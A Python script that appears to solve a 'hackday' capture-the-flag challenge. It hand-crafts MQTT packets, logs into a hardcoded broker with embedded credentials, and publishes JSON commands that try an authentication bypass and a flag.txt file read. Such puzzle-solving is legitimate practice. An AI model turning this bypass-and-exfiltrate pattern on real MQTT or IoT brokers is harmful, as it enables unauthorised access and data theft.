import socket
import struct
import time
import json
import random
import string

def mqtt_connect(client_id, username=None, password=None):
    flags = 0x02
    if username: flags |= 0x80
    if password: flags |= 0x40
    var_header = b'\x00\x04MQTT\x04' + bytes([flags]) + b'\x00\x3c'
    payload = struct.pack("!H", len(client_id)) + client_id.encode()
    if username:
        payload += struct.pack("!H", len(username)) + username.encode()
    if password:
        payload += struct.pack("!H", len(password)) + password.encode()
    rem_len = len(var_header) + len(payload)
    fixed_header = b'\x10' + bytes([rem_len])
    return fixed_header + var_header + payload

def mqtt_subscribe(topic, packet_id):
    var_header = struct.pack("!H", packet_id)
    payload = struct.pack("!H", len(topic)) + topic.encode() + b'\x00'
    rem_len = len(var_header) + len(payload)
    fixed_header = b'\x82' + bytes([rem_len])
    return fixed_header + var_header + payload

def mqtt_publish(topic, message):
    topic_len = struct.pack("!H", len(topic))
    payload = message.encode()
    rem_len = len(topic_len) + len(topic) + len(payload)
    fixed_header = b'\x30'
    fixed_header += bytes([rem_len]) # assuming < 128
    return fixed_header + topic_len + topic.encode() + payload

def solve():
    server = "51.210.244.18"
    port = 1883
    user = "hackday"
    pwd = "1Bc2Mk0rlevzuCG6AaDK6Opa"
    
    s = socket.create_connection((server, port), timeout=10)
    client_id = "solver_" + ''.join(random.choices(string.digits, k=8))
    s.sendall(mqtt_connect(client_id, user, pwd))
    connack = s.recv(4)
    
    resp_topic = "response/" + client_id
    s.sendall(mqtt_subscribe(resp_topic, 10))
    s.sendall(mqtt_subscribe("response/#", 11))
    s.sendall(mqtt_subscribe("flag/#", 12))
    
    # Try multiple variants of getflag with y2k bypass
    cmds = [
        {"cmd": "auth", "token": 0, "y2k": True, "response_topic": resp_topic},
        {"cmd": "getflag", "token": 0, "y2k": True, "response_topic": resp_topic},
        {"cmd": "getflag", "y2k": True, "response_topic": resp_topic},
        {"cmd": "getflag", "challenge": "Nobody like mosquitoes", "y2k": True, "response_topic": resp_topic},
        {"cmd": "getfile", "file": "flag.txt", "y2k": True, "response_topic": resp_topic}
    ]
    
    for c in cmds:
        msg = json.dumps(c)
        print(f"[*] Sending JSON to ctf/hackday: {msg}")
        s.sendall(mqtt_publish("ctf/hackday", msg))
        time.sleep(0.5)
        
    # Also try sending to y2k topic?
    s.sendall(mqtt_publish("y2k", json.dumps({"cmd": "flag"})))

    try:
        while True:
            data = s.recv(4096)
            if not data: break
            try:
                decoded = data.decode(errors='ignore')
                print(f"[*] Text: {decoded}")
                if "HACKDAY{" in decoded:
                    print("[!!!] FLAG FOUND [!!!]")
            except: pass
    except: pass
    finally:
        s.close()

if __name__ == "__main__":
    solve()
